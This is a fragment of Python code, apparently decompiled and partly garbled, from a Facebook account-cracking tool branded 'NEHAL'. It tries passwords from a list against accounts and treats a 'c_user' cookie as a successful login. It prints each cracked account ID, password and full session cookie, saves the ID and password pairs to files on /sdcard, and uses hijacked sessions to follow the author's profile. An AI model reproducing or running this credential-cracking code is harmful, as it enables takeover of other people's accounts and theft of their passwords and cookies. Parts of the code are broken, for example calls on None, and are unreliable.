...
def FD():
    ...
    if opt == '1':
        os.system('xdg-https://www.facebook.com/nehal.ahmed6' )
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW ME ON GITHUB')
    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW ME INSTAGRAM ')
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-https://github.com/weirdnehal ')
        return None
    if None == '4':
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/nehal.ahmed6', {
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(NEHAL-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NEHAL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(NEHAL-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/NEHAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[NEHAL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
